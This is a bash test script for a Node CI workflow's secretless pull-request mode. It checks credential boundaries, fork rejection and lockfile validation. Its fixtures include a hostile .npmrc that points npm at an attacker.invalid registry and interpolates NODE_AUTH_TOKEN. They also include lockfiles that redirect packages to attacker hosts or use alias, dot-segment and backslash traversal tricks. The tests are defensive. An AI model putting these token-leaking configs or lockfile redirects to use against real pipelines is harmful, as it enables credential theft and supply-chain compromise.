#!/usr/bin/env bash
set -uo pipefail

root="$(cd "$(dirname "$0")/../.." && pwd)"
workflow="$root/.github/workflows/node-ci.yml"
failures=0

pass() { printf 'ok - %s\n' "$1"; }
fail() { printf 'not ok - %s\n' "$1" >&2; failures=$((failures + 1)); }

python3 - "$workflow" <<'PY' \
  && pass "secretless mode separates credentialed acquisition from PR execution" \
  || fail "secretless mode does not preserve the two-job credential boundary"
import sys
import yaml

doc = yaml.safe_load(open(sys.argv[1], encoding="utf-8"))
inputs = doc[True]["workflow_call"]["inputs"]
jobs = doc["jobs"]
assert inputs["secretless-pr"]["default"] is False
assert inputs["approved-internal-packages"]["default"] == ""

acquire = jobs["acquire-secretless-dependencies"]
build = jobs["build-test"]
assert acquire["permissions"] == {"contents": "read"}
assert "inputs.secretless-pr" in acquire["if"]
assert acquire["runs-on"] == "${{ fromJSON(vars.VERJSON_LANE_UNTRUSTED || '[\"ubuntu-24.04\"]') }}"
assert "acquire-secretless-dependencies" in build["needs"]
assert build["permissions"] == {"contents": "read"}
assert build["runs-on"].startswith("${{ inputs.secretless-pr && fromJSON(vars.VERJSON_LANE_UNTRUSTED")
assert build["runs-on"].index("inputs.secretless-pr") < build["runs-on"].index("inputs.runner")

acquire_steps = acquire["steps"]
boundary = next(step for step in acquire_steps if step.get("name") == "Enforce the secretless PR boundary")
assert boundary["env"]["HEAD_REPOSITORY"] == "${{ github.event.pull_request.head.repo.full_name }}"
assert boundary["env"]["REPOSITORY"] == "${{ github.repository }}"
assert "same-repository pull request" in boundary["run"]
install = next(step for step in acquire_steps if step.get("name") == "Acquire dependencies without lifecycle execution")
assert install["env"]["NODE_AUTH_TOKEN"] == "${{ secrets.NODE_AUTH_TOKEN }}"
assert install["env"]["NPM_CONFIG_USERCONFIG"].startswith("${{ runner.temp }}/")
assert "find . -name .npmrc" in install["run"]
assert "npm ci --ignore-scripts --no-audit --no-fund" in install["run"]
checkout = next(step for step in acquire_steps if str(step.get("uses", "")).startswith("actions/checkout@"))
assert checkout["with"]["persist-credentials"] is False

build_steps = build["steps"]
build_checkout = next(step for step in build_steps if str(step.get("uses", "")).startswith("actions/checkout@"))
assert "secretless-pr" in build_checkout["with"]["persist-credentials"]
assert "secretless-pr" in build_checkout["with"]["submodules"]
assert build_checkout["with"]["token"].startswith("${{ inputs.secretless-pr && github.token")
root_install = next(step for step in build_steps if step.get("run") == "npm ci" and "working-directory" not in step)
assert "!inputs.secretless-pr" in root_install["if"]
for command in ("npm run build", "npm run typecheck --if-present", "npm test", "npm run lint --if-present"):
    step = next(step for step in build_steps if step.get("run") == command)
    assert "secrets." not in str(step.get("env", {}))
PY

acquire_script="$(mktemp)"
boundary_script="$(mktemp)"
python3 - "$workflow" "$boundary_script" > "$acquire_script" <<'PY'
import sys
import yaml

doc = yaml.safe_load(open(sys.argv[1], encoding="utf-8"))
for step in doc["jobs"]["acquire-secretless-dependencies"]["steps"]:
    if step.get("name") == "Enforce the secretless PR boundary":
        open(sys.argv[2], "w", encoding="utf-8").write(step["run"])
    if step.get("name") == "Acquire dependencies without lifecycle execution":
        print(step["run"])
PY

if EVENT_NAME=pull_request HEAD_REPOSITORY=Verjson/example REPOSITORY=Verjson/example \
    NODE_AUTH_TOKEN=token SCHEMA_DIR='' APPROVED_INTERNAL_PACKAGES='' bash "$boundary_script" \
    && ! EVENT_NAME=pull_request HEAD_REPOSITORY=attacker/fork REPOSITORY=Verjson/example \
      NODE_AUTH_TOKEN=token SCHEMA_DIR='' APPROVED_INTERNAL_PACKAGES='' bash "$boundary_script" >/dev/null 2>&1; then
  pass "same-repository PRs are admitted and fork PRs fail closed"
else
  fail "secretless event admission does not enforce same-repository pull requests"
fi

acquire_fixture="$(mktemp -d)"
mkdir -p "$acquire_fixture/bin" "$acquire_fixture/clean" "$acquire_fixture/malicious"
printf '%s\n' \
  'registry=https://attacker.invalid/' \
  '//attacker.invalid/:_authToken=${NODE_AUTH_TOKEN}' \
  > "$acquire_fixture/malicious/.npmrc"
printf '%s\n' '#!/usr/bin/env bash' 'printf '\''%s\n'\'' "$*" > "$NPM_STUB_LOG"' \
  > "$acquire_fixture/bin/npm"
chmod +x "$acquire_fixture/bin/npm"

trusted_user_config="$acquire_fixture/runner/secretless-acquisition.npmrc"
trusted_global_config="$acquire_fixture/runner/secretless-empty-global.npmrc"
mkdir -p "$acquire_fixture/runner"
if (cd "$acquire_fixture/clean" && PATH="$acquire_fixture/bin:$PATH" \
    NODE_AUTH_TOKEN='package-secret' NPM_STUB_LOG="$acquire_fixture/npm.log" \
    NPM_CONFIG_USERCONFIG="$trusted_user_config" \
    NPM_CONFIG_GLOBALCONFIG="$trusted_global_config" bash "$acquire_script") \
    && grep -qFx 'ci --ignore-scripts --no-audit --no-fund' "$acquire_fixture/npm.log" \
    && grep -qFx 'registry=https://registry.npmjs.org/' "$trusted_user_config" \
    && grep -qFx '@verjson:registry=https://npm.pkg.github.com/' "$trusted_user_config" \
    && grep -qFx '//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}' "$trusted_user_config" \
    && ! grep -q 'package-secret' "$trusted_user_config" \
    && [ ! -s "$trusted_global_config" ]; then
  pass "acquisition forces a trusted host-scoped npm config outside the checkout"
else
  fail "acquisition npm configuration is not fixed and host-scoped"
fi

if (cd "$acquire_fixture/malicious" && PATH="$acquire_fixture/bin:$PATH" \
    NODE_AUTH_TOKEN='package-secret' NPM_STUB_LOG="$acquire_fixture/malicious.log" \
    NPM_CONFIG_USERCONFIG="$trusted_user_config" \
    NPM_CONFIG_GLOBALCONFIG="$trusted_global_config" bash "$acquire_script") >/dev/null 2>&1 \
    || [ -e "$acquire_fixture/malicious.log" ]; then
  fail "a PR-controlled external-registry npmrc reached authenticated npm"
else
  pass "a PR-controlled external-registry/token-interpolation npmrc fails before npm"
fi

validator="$(mktemp)"
trap 'rm -f "$validator"' EXIT
awk '
  /- name: Validate approved internal dependency lock/ { found = 1; next }
  found && /python3 - <<'"'"'PY'"'"'/ { copying = 1; next }
  copying && /^          PY$/ { exit }
  copying { sub(/^          /, ""); print }
' "$workflow" > "$validator"

run_validator() {
  local fixture="$1" approved="$2"
  (cd "$fixture" && APPROVED_INTERNAL_PACKAGES="$approved" python3 "$validator")
}

fixture="$(mktemp -d)"
trap 'rm -f "$validator" "$acquire_script" "$boundary_script"; rm -rf "$fixture" "$acquire_fixture"' EXIT
mkdir -p "$fixture/valid" "$fixture/unapproved" "$fixture/external" "$fixture/unused" "$fixture/alias" "$fixture/direct" "$fixture/dot-segment" "$fixture/backslash"

make_lock() {
  local dir="$1" resolved="$2"
  printf '%s\n' "{\"lockfileVersion\":3,\"packages\":{\"\":{},\"node_modules/@verjson/identity-contracts\":{\"name\":\"@verjson/identity-contracts\",\"resolved\":\"$resolved\"}}}" > "$dir/package-lock.json"
}
make_lock "$fixture/valid" "https://npm.pkg.github.com/download/@verjson/identity-contracts/1.2.3/abc"
make_lock "$fixture/unapproved" "https://npm.pkg.github.com/download/@verjson/identity-contracts/1.2.3/abc"
make_lock "$fixture/external" "https://attacker.invalid/identity-contracts.tgz"
printf '%s\n' '{"lockfileVersion":3,"packages":{"":{}}}' > "$fixture/unused/package-lock.json"
printf '%s\n' '{"lockfileVersion":3,"packages":{"":{},"node_modules/@verjson/identity-contracts":{"name":"attacker-alias","resolved":"https://attacker.invalid/alias.tgz"}}}' > "$fixture/alias/package-lock.json"
printf '%s\n' '{"lockfileVersion":3,"packages":{"":{},"node_modules/innocent-name":{"resolved":"https://npm.pkg.github.com/download/@verjson/unapproved-private/1.0.0/abc"}}}' > "$fixture/direct/package-lock.json"
printf '%s\n' '{"lockfileVersion":3,"packages":{"":{},"node_modules/@verjson/identity-contracts":{"resolved":"https://npm.pkg.github.com/download/@verjson/identity-contracts/../../@verjson/unapproved-private/1.0.0/abc"}}}' > "$fixture/dot-segment/package-lock.json"
printf '%s\n' '{"lockfileVersion":3,"packages":{"":{},"node_modules/@verjson/identity-contracts":{"resolved":"https://npm.pkg.github.com/download/@verjson/identity-contracts/..%5C..%5C@verjson%5Cunapproved-private%5C1.0.0/abc"}}}' > "$fixture/backslash/package-lock.json"

run_validator "$fixture/valid" '@verjson/identity-contracts' >/dev/null 2>&1 \
  && pass "an exact allowlisted GitHub Packages dependency is accepted" \
  || fail "an exact allowlisted GitHub Packages dependency was rejected"
if run_validator "$fixture/unapproved" '' >/dev/null 2>&1; then
  fail "an unapproved internal dependency was accepted"
else
  pass "an unapproved internal dependency is rejected"
fi
if run_validator "$fixture/external" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "an approved name redirected to an external registry was accepted"
else
  pass "an approved name redirected to an external registry is rejected"
fi
if run_validator "$fixture/unused" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "an unused approval was accepted"
else
  pass "an unused approval is rejected"
fi
if run_validator "$fixture/alias" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "an internal package path aliased to an attacker-controlled package was accepted"
else
  pass "an internal package path alias is rejected"
fi
if run_validator "$fixture/direct" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "a direct URL to an unapproved private package was accepted"
else
  pass "a direct URL to an unapproved private package is rejected"
fi
if run_validator "$fixture/dot-segment" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "a dot-segment URL normalizing to an unapproved private package was accepted"
else
  pass "a dot-segment private package URL is rejected"
fi
if run_validator "$fixture/backslash" '@verjson/identity-contracts' >/dev/null 2>&1; then
  fail "a backslash URL normalizing to an unapproved private package was accepted"
else
  pass "a backslash-normalized private package URL is rejected"
fi

grep -qF 'ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL' "$workflow" \
  && grep -qF 'printf '\''NPM_CONFIG_USERCONFIG=%s\n'\''' "$workflow" \
  && pass "PR execution persistently scrubs package, Git, cloud, and OIDC credential paths" \
  || fail "PR execution credential scrubbing is incomplete"

exit "$failures"
